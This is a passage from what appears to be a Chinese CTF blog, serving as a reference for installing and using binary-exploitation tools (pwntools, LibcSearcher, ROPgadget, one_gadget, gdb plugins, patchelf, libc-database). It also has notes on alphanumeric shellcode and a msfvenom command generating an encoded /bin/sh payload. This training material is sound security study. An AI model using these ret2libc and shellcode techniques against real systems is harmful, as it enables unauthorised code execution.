<h3 id="x64系统下："><a href="#x64系统下：" class="headerlink" title="x64系统下："></a>x64系统下：</h3><p>原理与x86并无不同，唯一需要注意的就是x64系统下，函数的前六位参数是使用寄存器存放的，顺序为RDI,RSI,RDX,RCX,R8,R9对应前六位参数，所以在gdb中相对偏移时，要把栈上的偏移加上相差寄存器的数量的才是n的值</p>
</li>
</ul>
<p>参考：</p>
<p>ctf-wiki格式化字符串漏洞</p>
]]></content>
  </entry>
  <entry>
    <title>pwn工具的安装及使用指令</title>
    <url>/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/Gallopsled/pwntools.git<br>sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential<br>python3 -m pip install --upgrade pip<br>python3 -m pip install --upgrade pwntools<br></code></pre></td></tr></table></figure>

<h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><p>1、安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/lieanu/LibcSearcher.git<br><span class="hljs-built_in">cd</span> LibcSearcher<br>sudo python3 setup.py develop<br></code></pre></td></tr></table></figure>

<p>2、错误：</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2020101521162965.png"></p>
<p>处理办法：</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/20201015211718534.png"></p>
<p>3、常见用法（脚本中使用）</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr（指的是got表地址）)<br>libc_base=puts_addr-libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libc_base+libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr=libc_base+libc.<span class="hljs-keyword">dump</span>(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>以上内容转载<a href="https://blog.csdn.net/yongbaoii/article/details/109105721">LibcSearcher 安装 错误处理 与使用</a></p>
<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>一般用在64位下，因为64位的函数传参与32位有些不同，需使用到寄存器传参，常用命令格式：</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span>  或者 <span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span>| <span class="hljs-string">grep</span> <span class="hljs-string">&#x27;eax&#x27;</span> <br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;leave|ret&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;call|rax&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--string</span> <span class="hljs-string">&#x27;sh&#x27;</span>（有的时候是找<span class="hljs-string">sh</span>，这个也可以成为参数）<br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--string</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;int&#x27;</span>  （寻找<span class="hljs-string">int</span> <span class="hljs-string">80H</span>系统中断指令）<br></code></pre></td></tr></table></figure>

<p>文件也可以是libc</p>
<p>附：</p>
<p>搭配使用 one_gadget</p>
<p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs linux">sudo apt install -y ruby ruby-dev<br>sudo gem install one_gadget<br></code></pre></td></tr></table></figure>

<p>one_gadget 是用来去查找动态链接库里execve(“/bin/sh”, rsp+0x70, environ)函数的地址的</p>
<p>使用方法：</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2020101517362410.png"></p>
<p>但是这样只会给出常见的容易满足的one_gadget，通过下面指令可以查询到一些比较难满足的one_gadget</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">one_gadget libc-<span class="hljs-number">2.27</span>.so <span class="hljs-comment">--l 2</span><br>或者 one_gadget libc-<span class="hljs-number">2.27</span>.so <span class="hljs-comment">--level 2</span><br></code></pre></td></tr></table></figure>

<p>来源： <a href="https://blog.csdn.net/yongbaoii/article/details/109101822">https://blog.csdn.net/yongbaoii/article/details/109101822</a> </p>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>先装，因为这个带有 parseheap、以及 heapinfo 等指令，有的场景下更好用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/scwuaptx/Pwngdb.git <br>cp ./Pwngdb/.gdbinit ~/<br></code></pre></td></tr></table></figure>

<p>pwndbg：pwndbg (/poʊnddb æg/)是一个GDB插件，使GDB的调试不那么糟糕，重点关注低级软件开发人员、硬件黑客、逆向工程师和开发人员需要的特性</p>
<p>peda：GDB的Python开发协助</p>
<p>gef：GEF(发音为ʤɛf -“Jeff”)是一组用于x86/64、ARM、MIPS、PowerPC和SPARC的命令，用于在使用老式GDB时帮助开发人员和反向工程师</p>
<p>把这三个都先下载下来：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/longld/peda.git<br>git clone https://github.com/pwndbg/pwndbg.git<br>git clone https://github.com/hugsy/gef.git<br></code></pre></td></tr></table></figure>

<p>pwndbg安装：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure>

<p>安装插件依赖：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">sudo pip install keystone-engine ropper keystone-engine<br></code></pre></td></tr></table></figure>

<p>更换gdb指令，在gef、pwndbg、peda中选择，选哪个就把其他都注释掉</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo vim ~/.gdbinit<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># vim后在文件内输入下方横线中内容，选择三个插件其中一个，另外两个注释掉，保存退出</span></span><br>-------------------------------------------------------------------------<br>source /home/hollk/tools/pwndbg/gdbinit.py <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">source</span> /home/hollk/tools/peda/peda.py</span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">source</span> /home/hollk/tools/gef-dev/gef.py</span><br>-------------------------------------------------------------------------<br></code></pre></td></tr></table></figure>

<h3 id="1-用途"><a href="#1-用途" class="headerlink" title="1. 用途"></a>1. 用途</h3><p>启动你的程序，可以按照你的自定义的要求随心所欲的运行程序</p>
<p>可让被调试的程序在你所指定的调置的断点处停住。（断点可以是条件表达式）</p>
<p>当程序被停住时，可以检查此时你的程序中所发生的事。</p>
<p>动态的改变你程序的执行环境</p>
<p>使用前要：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -g test.c -o test<br>//gcc中-g选项是为了获得有关调试信息，要用gdb进行调试，必须使用-g生成二进制可执行文件<br>//补充 使用指定的glibc与ld编译程序<br>gcc test.c -o test -Wl,--rpath=/usr/local/lib -Wl,--dynamic-linker=/path/to/glibc-build/elf/ld-linux-x86-64.so.2<br></code></pre></td></tr></table></figure>



<h3 id="2-常用指令："><a href="#2-常用指令：" class="headerlink" title="2. 常用指令："></a>2. 常用指令：</h3><ul>
<li><p>checksec 查看elf编译的保护选项</p>
</li>
<li><p>aslr 查看gdb的aslr设置 aslr on 可开启alsr设置</p>
</li>
<li><p>file 文件名 加载objfile </p>
</li>
<li><p>disas addr 对地址addr处的指令进行反汇编，addr可以是函数名（但是不加* 使用函数名就无法用于参数确认；不加*，断点就不会设置到汇编语言层级的函数开头）</p>
</li>
<li><p>b *addr 在addr处下一个断点   b后跟函数名就不用 *</p>
</li>
<li><p>rwatch *addr 在addr处下一个硬件断点   </p>
</li>
<li><p>enable 激活断点</p>
</li>
<li><p>disable 禁用断点</p>
</li>
<li><p>info b 查看断点</p>
</li>
<li><p>del num 删除断点</p>
</li>
<li><p>x addr 查看addr处存储的数据值 </p>
</li>
<li><p>x/wx $esp 　　以4字节16进制显示栈中内容</p>
</li>
<li><p>stack 100　　 插件提供，显示栈中100项</p>
</li>
<li><p>find xxx　　 快速查找，很实用</p>
</li>
<li><p>r 运行被调试的程序 </p>
</li>
<li><p>c 继续运行 </p>
</li>
<li><p>ni 单步执行不进入函数调用</p>
</li>
<li><p>si 单步执行并进入函数调用</p>
</li>
<li><p>elfsymbol – 获取non-debugging symbol信息（plt表）</p>
</li>
<li><p>parseheap 可以对heap进行分析，得到相关信息</p>
</li>
<li><p>dumprop –在给定内存范围中Dump出所有ROP gadgets </p>
</li>
<li><p>vmmap 得到虚拟映射地址，同时可查看执行权限</p>
</li>
<li><p>heapinfo 查看bin链信息</p>
</li>
<li><p>heapbase 查看堆地址</p>
</li>
<li><p>finish 执行到函数返回</p>
</li>
<li><p>arena 查看 mainarena</p>
</li>
<li><p>telescope 地址    可以查看一小段该地址的内容</p>
</li>
<li><p>dumpargs– 函数将要被调用时，显示将要被传入函数的所有参数</p>
</li>
<li><p>readelf – 获取elf头信息 </p>
</li>
<li><p>x/&lt;n/f/u&gt;其中n、f、u是可选的参数</p>
<p>x/s 地址　　查看字符串</p>
<p>x/wx 地址　　查看DWORD</p>
<p>x/c 地址　　单字节查看</p>
<p>x/16x $esp+0x12 查看寄存器偏移（16代表查看16个）</p>
</li>
</ul>
<ul>
<li>set args 可指定程序运行时参数。（如：set args 10 20 30 40 50）</li>
<li>set $rdi=0x10 把rdi寄存器的值变为0x10</li>
<li>set <em>(0x123456)=0x10  0x123456地址的值变为0x10，*<em>注意带星号</em></em></li>
<li>show args 命令可以查看设置好的运行参数。</li>
<li>break fun if $rdi==5 条件断点，rdi值为5的时候才断</li>
</ul>
<p>参数意义：</p>
<p>s 按字符串输出</p>
<p>x 按十六进制格式显示变量。</p>
<p>d 按十进制格式显示变量。</p>
<p>u 按十六进制格式显示无符号整型。</p>
<p>o 按八进制格式显示变量。</p>
<p>t 按二进制格式显示变量。</p>
<p>a 按十六进制格式显示变量。</p>
<p>c 按字符格式显示变量。</p>
<p>f 按浮点数格式显示变量。</p>
<h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><ul>
<li><p>si 步入，可以进入查看具体的函数调用。</p>
</li>
<li><p>n 执行下一条语句（C代码中的一句语句），ni 步入，这个执行的是下一条汇编指令</p>
</li>
<li><p>b 在某处下断点，可以用</p>
</li>
<li><ul>
<li>b * adrress</li>
<li>b function_name</li>
<li>info b 查看断点信息</li>
<li>delete 1 删除第一个断点</li>
</ul>
</li>
<li><p>c 继续</p>
</li>
<li><p>r 执行</p>
</li>
<li><p><strong>disas addr 查看addr处前后的反汇编代码</strong></p>
</li>
<li><p>readelf 文件信息</p>
</li>
</ul>
<p>一般c,n,ni后面都可以跟数字，</p>
<p>ni 10</p>
<p>就代表下10行指令</p>
<h3 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h3><h4 id="p"><a href="#p" class="headerlink" title="p"></a>p</h4><ul>
<li>p function 显示某个函数地址</li>
<li>p $esp 某个寄存器的值</li>
<li><strong>p 0xdd-0x55 可以当计算器</strong></li>
<li><strong>p &amp;VarName 查看变量地址</strong></li>
<li>p * 0xffffebac 查看某个地址处的值</li>
</ul>
<h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><ul>
<li>x/10wx addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
<li>x/40gx addr 跟上面一样，一般上面32位用，这个64位</li>
<li>x/10s addr 查看addr开始的10个字符串</li>
<li>x/x $esp 查看esp寄存器中的值</li>
<li>x/b addr 查看addr处的字符</li>
<li><strong>x/10i addr 查看addr处的反汇编结果（addr可以为函数）（常用）</strong></li>
</ul>
<h4 id="info-i"><a href="#info-i" class="headerlink" title="info(i)"></a>info(i)</h4><ul>
<li><strong>info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp)</strong></li>
<li>i r eflags 查看状态寄存器</li>
<li>i r  查看所有寄存器</li>
<li>i b 查看断点信息</li>
<li>i functions 查看所有的函数</li>
</ul>
<h4 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h4><ul>
<li>search mem 查找字符串 peda带有</li>
</ul>
<h2 id="pwntools-1"><a href="#pwntools-1" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="1-context设置"><a href="#1-context设置" class="headerlink" title="1. context设置"></a>1. context设置</h3><p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p>
<p>一般来说我们设置context只需要简单的一句话:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>这句话的意思是： </p>
<ol>
<li>os（operating system 操作系统）设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li>
<li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li>
<li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li>
</ol>
<h3 id="2-Cyclic-Pattern"><a href="#2-Cyclic-Pattern" class="headerlink" title="2. Cyclic Pattern"></a>2. Cyclic Pattern</h3><p>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置。</p>
<p>在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。 </p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">用法：<br>cyclic(<span class="hljs-number">0</span>x100) <span class="hljs-meta"># 生成一个0x100大小的pattern，即一个特殊的字符串</span><br>cyclic_find(<span class="hljs-number">0</span>x61616161) <span class="hljs-meta"># 找到该数据在pattern中的位置</span><br>cyclic_find(&#x27;aaaa&#x27;) <span class="hljs-meta"># 查找位置也可以使用字符串去定位</span><br></code></pre></td></tr></table></figure>

<p>比如，我们在栈溢出的时候，首先构造<code>cyclic(0x100)</code>，或者更长长度的pattern，进行输入，输入后pc的值变为了0x61616161，那么我们通过<code>cyclic_find(0x61616161)</code>就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算。</p>
<p>可以直接在shell中使用cyclic 100</p>
<p>然后查找溢出点 使用 cyclic -l 0x61616161</p>
<p>来源：<a href="https://blog.csdn.net/qq_29343201/article/details/51337025">https://blog.csdn.net/qq_29343201/article/details/51337025</a></p>
<p><strong>转载自：<a href="https://blog.csdn.net/qq_41560595/article/details/114597342">https://blog.csdn.net/qq_41560595/article/details/114597342</a></strong></p>
<h2 id="patchelf-amp-amp-glibc-all-in-one"><a href="#patchelf-amp-amp-glibc-all-in-one" class="headerlink" title="patchelf &amp;&amp; glibc-all-in-one"></a>patchelf &amp;&amp; glibc-all-in-one</h2><p><strong>patchelf</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/NixOS/patchelf<br></code></pre></td></tr></table></figure>

<p><strong>glibc-all-in-one</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one<br></code></pre></td></tr></table></figure>

<h3 id="1-安装glibc-all-in-one"><a href="#1-安装glibc-all-in-one" class="headerlink" title="1. 安装glibc-all-in-one"></a>1. 安装glibc-all-in-one</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 update_list             <span class="hljs-comment">#更新最新版本的glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat list                 <span class="hljs-comment">#查看可下载的glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./download 2.23-0ubuntu11.2_amd64        <span class="hljs-comment">#glibc为你想要下载glibc的名字</span></span><br></code></pre></td></tr></table></figure>

<h3 id="2-安装patchelf"><a href="#2-安装patchelf" class="headerlink" title="2. 安装patchelf"></a>2. 安装patchelf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./bootstrap.sh<br>./configure<br>make<br>sudo make install<br>make check<br></code></pre></td></tr></table></figure>

<p>可能会遇到 <code>autoreconf: not found</code></p>
<p>安装一下就好</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get install autoconf automake libtool<br></code></pre></td></tr></table></figure>

<h3 id="3-生成所需的符号链接"><a href="#3-生成所需的符号链接" class="headerlink" title="3.生成所需的符号链接"></a>3.生成所需的符号链接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"><span class="hljs-built_in">cd</span> /libs  <span class="hljs-comment">#进入libs的目录</span></span>  <br><span class="hljs-meta">$</span><span class="bash"> sudo su    <span class="hljs-comment">#进入root态</span></span><br><span class="hljs-meta">$</span><span class="bash"> ln -s /home/pwn/桌面/tools/glibc-all-in_one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so ./23_11-linux.so.2</span><br><span class="hljs-meta">#</span><span class="bash">./23_11-linux.so.2是自己起的名。23代表glibc版本,11代表ubuntu后面的数字(单纯为了好记)</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l <span class="hljs-comment">#可以看到生成的符号链接</span></span><br></code></pre></td></tr></table></figure>

<p>文件路径要注意修改为自己的路径</p>
<h3 id="4-更改elf文件的ld和libc"><a href="#4-更改elf文件的ld和libc" class="headerlink" title="4.更改elf文件的ld和libc"></a>4.更改elf文件的ld和libc</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> patchelf --set-interpreter /lib64/23_11-linux.so.2 ./chunk_extend_2</span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --replace-needed libc.so.6 /home/pwn/桌面/tools/glibc-all-in_one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so ./chunk_extend_2</span><br><span class="hljs-meta">#</span><span class="bash">libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    chunk_extend_2 是二进制文件名</span><br><span class="hljs-meta">$</span><span class="bash"> ldd ./bin <span class="hljs-comment">#查看elf的ld和libc</span></span><br></code></pre></td></tr></table></figure>

<p>glibc-2.34及以上：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># binary为你想运行的elf文件  第一个参数是ld.so的目录</span><br>patchelf --set-interpreter /home/shoucheng/tools/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/ld-linux-x86-64.so.2 ./binary     <br><br><span class="hljs-comment"># 第一个参数是libc所在目录 binary你想运行的elf文件</span><br>patchelf --set-rpath  /home/shoucheng/tools/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/ ./binary<br></code></pre></td></tr></table></figure>

<h3 id="我自己调试情况："><a href="#我自己调试情况：" class="headerlink" title="我自己调试情况："></a>我自己调试情况：</h3><p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418121652.png"></p>
<p>首先，这是还未更换的文件的ld和libc</p>
<p>当输入<code>patchelf --replace-needed libc.so.6 /home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc.so.6 1</code>时</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418122225.png"></p>
<p>可以发现，libc.so.6的路径被更换了，换为了glibc-all-in-on目录下的libc.so.6，本来按照上面的来讲，总共是要两步的，先是更换链接器，然后改变libc路径。但是我直接去修改libc的路径，得到的结果是跟上述是一样的，已经完成了修改。</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418122806.png"></p>
<p>去修改链接器，最终指向的仍然是<code>/lib64/ld-linux-x86-64.so.2</code> 并没有在本质上改变了什么</p>
<p>结论为：暂时不知道是因为什么，不过还是建议按上面步骤来</p>
<h2 id="seccomp-tools-工具"><a href="#seccomp-tools-工具" class="headerlink" title="seccomp-tools 工具"></a>seccomp-tools 工具</h2><p>可以<strong>seccomp-tools</strong>这个工具去查看禁用的系统调用</p>
<ul>
<li><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt install gcc ruby-dev<br>sudo gem install seccomp-tools<br></code></pre></td></tr></table></figure></li>
<li><p>使用：一般用到dump这个用法，其他详细用法可见上面github。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./xxx<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc_database"></a>libc_database</h2><p>有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。</p>
<p>先下载libc database</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/niklasb/libc-database<br></code></pre></td></tr></table></figure>

<p>利用get来下载流行的libc库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd libc-database<br>./get ubuntu<br></code></pre></td></tr></table></figure>

<p>程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下</p>
<p>用法：使用./find可以在db中找到对应libc，如泄露的地址是printf 0xf7xxxx260 puts 0xf7xxxf30，输入最后三位即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./find <span class="hljs-built_in">printf</span> 260 puts f30</span><br></code></pre></td></tr></table></figure>

<h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> pip install z3-solver</span><br></code></pre></td></tr></table></figure>

<p>在python3上安装这个库即可，功能十分强大，可以在python中用这个库解决任何方程（只要有解）</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>来源：<a href="https://www.jianshu.com/p/64d87659673a">https://www.jianshu.com/p/64d87659673a</a></p>
<p>首先要给所有的变量设置一个类型，他有很多种类型，Int型他代表整数所有的解都只能是整数，当然也可以用Ints一次性设置多个变量</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/webp"><span class="image-caption">img</span></p>
<p>还有就是Real型的这个代表的是有理数，可以解出所有的有理数</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2"><span class="image-caption">img</span></p>
<p>BitVec(‘a’ , 8)，用来进行位的运算与求解（第二个是指变量的位的个数）</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/3"><span class="image-caption">img</span></p>
<p>首先是给变量赋值，设置一个解方程的类Solver，然后一个一个添加（这样比较直观），check一下看看有没有解，最后得出一个解，当然还有另外一种方法</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/4"><span class="image-caption">img</span></p>
<p>直接用solve函数就可以了</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/5"><span class="image-caption">img</span></p>
<h2 id="纯字符shellcode"><a href="#纯字符shellcode" class="headerlink" title="纯字符shellcode"></a>纯字符shellcode</h2><p>来源：</p>
<p><a href="https://www.codenong.com/cs105236336/">https://www.codenong.com/cs105236336/</a></p>
<p><a href="https://xz.aliyun.com/t/5662#toc-4">https://xz.aliyun.com/t/5662#toc-4</a></p>
<p><a href="https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/">https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/</a></p>
<h3 id="可见字符能组成的汇编代码"><a href="#可见字符能组成的汇编代码" class="headerlink" title="可见字符能组成的汇编代码"></a>可见字符能组成的汇编代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">1.数据传送:<br>push/pop eax…<br>pusha/popa<br><br>2.算术运算:<br>inc/dec eax…<br>sub al, 立即数<br>sub byte ptr [eax… + 立即数], al dl…<br>sub byte ptr [eax… + 立即数], ah dh…<br>sub dword ptr [eax… + 立即数], esi edi<br>sub word ptr [eax… + 立即数], si di<br>sub al dl…, byte ptr [eax… + 立即数]<br>sub ah dh…, byte ptr [eax… + 立即数]<br>sub esi edi, dword ptr [eax… + 立即数]<br>sub si di, word ptr [eax… + 立即数]<br><br>3.逻辑运算:<br>and al, 立即数<br>and dword ptr [eax… + 立即数], esi edi<br>and word ptr [eax… + 立即数], si di<br>and ah dh…, byte ptr [ecx edx… + 立即数]<br>and esi edi, dword ptr [eax… + 立即数]<br>and si di, word ptr [eax… + 立即数]<br><br>xor al, 立即数<br>xor byte ptr [eax… + 立即数], al dl…<br>xor byte ptr [eax… + 立即数], ah dh…<br>xor dword ptr [eax… + 立即数], esi edi<br>xor word ptr [eax… + 立即数], si di<br>xor al dl…, byte ptr [eax… + 立即数]<br>xor ah dh…, byte ptr [eax… + 立即数]<br>xor esi edi, dword ptr [eax… + 立即数]<br>xor si di, word ptr [eax… + 立即数]<br><br>4.比较指令:<br>cmp al, 立即数<br>cmp byte ptr [eax… + 立即数], al dl…<br>cmp byte ptr [eax… + 立即数], ah dh…<br>cmp dword ptr [eax… + 立即数], esi edi<br>cmp word ptr [eax… + 立即数], si di<br>cmp al dl…, byte ptr [eax… + 立即数]<br>cmp ah dh…, byte ptr [eax… + 立即数]<br>cmp esi edi, dword ptr [eax… + 立即数]<br>cmp si di, word ptr [eax… + 立即数]<br><br>5.转移指令:<br>push 56h<br>pop eax<br>cmp al, 43h<br>jnz lable<br><br>&lt;=&gt; jmp lable<br><br>6.交换al, ah<br>push eax<br>xor ah, byte ptr [esp] // ah ^= al<br>xor byte ptr [esp], ah // al ^= ah<br>xor ah, byte ptr [esp] // ah ^= al<br>pop eax<br><br>7.清零:<br>push 44h<br>pop eax<br>sub al, 44h ; eax = 0<br><br>push esi<br>push esp<br>pop eax<br>xor [eax], esi ; esi = 0<br></code></pre></td></tr></table></figure>

<h3 id="msf内置的encoder"><a href="#msf内置的encoder" class="headerlink" title="msf内置的encoder"></a>msf内置的encoder</h3><h4 id="一、内置的shellcode"><a href="#一、内置的shellcode" class="headerlink" title="一、内置的shellcode"></a>一、内置的shellcode</h4><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/sh&quot; -e x86/alpha_upper BufferRegister=eax<br></code></pre></td></tr></table></figure>

